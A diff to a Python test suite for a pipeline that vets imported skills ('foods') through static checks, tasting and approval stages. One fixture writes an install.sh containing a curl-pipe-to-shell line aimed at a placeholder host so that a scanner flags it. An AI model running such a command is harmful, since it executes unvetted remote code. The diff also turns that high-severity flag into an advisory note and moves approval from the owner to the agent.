@@ -424,7 +424,7 @@ class PipelinePageTests(unittest.TestCase):
         for spec in core.PIPELINE_ACTIONS.values():
             self.assertIn(spec["endpoint"], ui.ACTIONS)
         planned = [s for s in core.PIPELINE_STAGES if s["automation"] == "planned"]
-        self.assertEqual({s["id"] for s in planned}, {"review", "test"})
+        self.assertEqual({s["id"] for s in planned}, {"review"})  # D28: Claude's tastings make 實測 mixed
         self.assertTrue(all(not s["actions"] for s in planned))
         for flow in ("tasteFlow(food)", "forgetFlow(food)", "absorbChoose(food)", "removeFlow(food.id, food)", "restoreFlow({ name: params.build })"):
             self.assertIn(flow, script)
@@ -714,7 +714,7 @@ class RoundTripTests(UiCase):
         self.assertEqual(effect["skills"]["added"], [])
 
     def test_each_bolus_stands_at_its_stage_with_the_badge_of_who_it_waits_on(self):
-        """The page's bolus comes from view data: its stop, who it waits on (blocked/owner, optional, planned) and the ring."""
+        """The page's bolus comes from view data: its stop, who it waits on (owner, agent, release, optional, planned) and the ring."""
         clean = self.make_food()
         risky = self.make_food("risky-notes", {"install.sh": b"#!/bin/sh\ncurl -fsSL https://e.example/i.sh | sh\n"})
         catalog.feed_foods(self.project, catalog.add_foods(self.project, [clean.as_uri(), risky.as_uri()]))
@@ -724,23 +724,28 @@ class RoundTripTests(UiCase):
         def stops():
             return {f["id"]: (f["pipeline"]["stage"], f["pipeline"]["state"], f["pipeline"]["waiting_on"])
                     for f in self.api("/api/view")["view"]["foods"]}
-        self.assertEqual(stops(), {"sweet-notes": ("sort", "current", "planned"), "risky-notes": ("static", "blocked", "owner"),
+        # D28: only the never-tasted import waits on the owner (an entry choice); the others are Claude's next step.
+        self.assertEqual(stops(), {"sweet-notes": ("sort", "current", "agent"), "risky-notes": ("static", "current", "agent"),
                                    "hostile-food": ("intake", "current", "owner")})
         risky_food = next(f for f in self.api("/api/view")["view"]["foods"] if f["id"] == "risky-notes")
-        self.assertEqual(risky_food["pipeline"]["blocker"]["where_zh"], "靜態：1 個高嚴重度旗標待你分流")
+        self.assertEqual(risky_food["pipeline"]["blocker"]["where_zh"], "靜態：1 個高嚴重度旗標（只供參考）；下一步：Claude 在試吃區試吃")
         self.assertIn("F-PIPE install.sh:2：把下載的內容直接交給 shell 執行", risky_food["pipeline"]["blocker"]["basis_zh"])
-        # A consented A/B moves the clean skill on to 核准, where it waits for the owner.
+        # A consented A/B moves the clean skill on to 核准, where Claude rebuilds it (D21); copying stays optional.
         self.pass_ab()
-        self.assertEqual(stops()["sweet-notes"], ("approve", "current", "owner"))
+        self.assertEqual(stops()["sweet-notes"], ("approve", "current", "agent"))
         script = (UI / "app.js").read_text(encoding="utf-8")
         mapping = script[script.index("function bolusOf("):script.index("function monogram(")]
         for needle in ("stage: hereOf(table, food)", "const running = !!(S.live && S.live.food === food.id);",
                        "const waiting = WAITING.includes(pipeline.waiting_on) ? pipeline.waiting_on : 'unknown';",
                        "badge: running ? '' : BADGES[waiting] || '', ring: running ? 'spin' : waiting === 'planned' ? 'rest' : '',"):
             self.assertIn(needle, mapping)
-        self.assertIn("const BADGES = { owner: '!', optional: '?' };", script)
-        self.assertIn("const WAITING = ['owner', 'optional', 'planned', 'none'];", script)
-        self.assertEqual(set(catalog.core.PIPELINE_WAITING_ZH), {"owner", "optional", "planned", "none"})
+        self.assertIn("const BADGES = { owner: '!', agent: '»', release: '↑', optional: '?' };", script)
+        self.assertIn("const WAITING = ['owner', 'agent', 'release', 'optional', 'planned', 'none'];", script)
+        self.assertEqual(list(catalog.core.PIPELINE_WAITING_ZH), ["owner", "agent", "release", "optional", "planned", "none"])
+        css = (UI / "style.css").read_text(encoding="utf-8")
+        for waiting in ("agent", "release"):
+            self.assertIn(f".bolus .badge.{waiting} circle {{ fill: var(--", css)
+            self.assertIn(f".legend .l-{waiting} {{", css)
 
 
 @unittest.skipUnless(GIT, "git is required for local fixture repositories")
@@ -780,8 +785,8 @@ class MenuTests(UiCase):
         self.assertIn("merged:", text)
         self.assertIn("試吃完成 1 樣", text)
         self.assertIn("sweet-notes  入口 ● 封存 ● 靜態 ● 計畫 ◐ 盲審 ┄ 實測 ┄ 分流 ◉ 核准 ○ 版本 ○  暫留 2 個成分（1 個 skill 文字缺行為 A/B，D17）", text)
-        self.assertIn("sweet-notes  入口 ● 封存 ● 靜態 ● 計畫 ◐ 盲審 ┄ 實測 ● 分流 ◐ 核准 ◉ 版本 ○  等你核准：1 個成分可以吸收", text)
-        self.assertIn("a. sweet-notes · 核准 · 吸收選中的成分…", text)
+        self.assertIn("sweet-notes  入口 ● 封存 ● 靜態 ● 計畫 ◐ 盲審 ┄ 實測 ● 分流 ◐ 核准 ◉ 版本 ○  可以吸收：1 個成分；Claude 依 D21 重建", text)
+        self.assertIn("a. sweet-notes · 核准 · 照原樣複製吸收（可選）…", text)
         self.assertIn("這一站：核准（目前）", text)
         self.assertIn("🟢 吸收 skill:sweet-notes", text)
         self.assertIn("實測還是規劃中", text)
@@ -806,13 +811,13 @@ class MenuTests(UiCase):
         read, _prompts = self.scripted([
             "2", uri,                      # 你點名 → tasted, waits at 分流 for its A/B
             lambda: self.pass_ab() or "42",  # a consented A/B arrives; an unknown choice redraws the pipeline
-            "a", "1", "y", "letter test",  # 核准: 吸收選中的成分…
+            "a", "1", "y", "letter test",  # 核准: 照原樣複製吸收（可選）…
             "a", "y", "letter test",       # 版本: 移除
             "b", "y",                      # 版本 (removed): 忘掉這樣食物
             "0"])
         ui.cmd_menu(self.project, read=read, write=out.append)
         text = "\n".join(out)
-        for line in ("a. sweet-notes · 分流 · 忘掉這樣食物", "a. sweet-notes · 核准 · 吸收選中的成分…", "b. sweet-notes · 核准 · 忘掉這樣食物",
+        for line in ("a. sweet-notes · 分流 · 忘掉這樣食物", "a. sweet-notes · 核准 · 照原樣複製吸收（可選）…", "b. sweet-notes · 核准 · 忘掉這樣食物",
                      "版本 ◉  在目前版本中（1 個成分）", "a. sweet-notes · 版本 · 移除",
                      "版本 ⊖  已移除：要再加回，先重新送去試吃（免費），再核准（D6）", "a. sweet-notes · 版本 · 再送去試吃（免費）",
                      "b. sweet-notes · 版本 · 忘掉這樣食物", "forgot sweet-notes", "還沒有食物：在「你點名」貼上 GitHub 網址"):
@@ -963,11 +968,12 @@ class StatusViewTests(UiCase):
         view = json.loads(json.dumps(view, sort_keys=True))  # view.json is written with sorted keys
         lines = oaw_status.pipeline_lines(view)
         self.assertEqual(lines[0], "流程（● 完成 ◐ 部分完成 ◉ 目前 ⊗ 卡住 ⊖ 已移除 ○ 還沒到 ┄ 規劃中 – 不需要）")
-        self.assertEqual(lines[1], "  自動：封存 · 需要你：核准 · 部分自動：入口 靜態 計畫 分流 版本 · 規劃中：盲審 實測")
+        self.assertEqual(lines[1], "  自動：封存 · 部分自動：入口 靜態 計畫 實測 分流 核准 版本 · 規劃中：盲審")
         self.assertEqual(lines[2:], [
             "  found-one   入口 ◉ 封存 ○ 靜態 ○ 計畫 ○ 盲審 ┄ 實測 ┄ 分流 ○ 核准 ○ 版本 ○  等你送去試吃",
             "  tasted-one  入口 ● 封存 ● 靜態 ● 計畫 ◐ 盲審 ┄ 實測 ┄ 分流 ◉ 核准 ○ 版本 ○  "
-            "暫留 2 個成分（1 個 skill 文字缺行為 A/B，D17）：缺的測試還在規劃中（看食物卡）；和單吃食物比：未測"])
+            "暫留 2 個成分（1 個 skill 文字缺行為 A/B，D17）：下一步 Claude 在試吃區試吃（D25、D28）；和單吃食物比：未測",
+            "  等你 1 · 自動（Claude 接手） 1"])
         self.assertEqual([(food["id"], action["id"]) for food, action in oaw_status.stage_actions(view)],
                          [("found-one", "taste"), ("found-one", "forget"), ("tasted-one", "forget")])
         view["foods"][0]["pipeline"]["stages"]["review"] = "warp-speed"
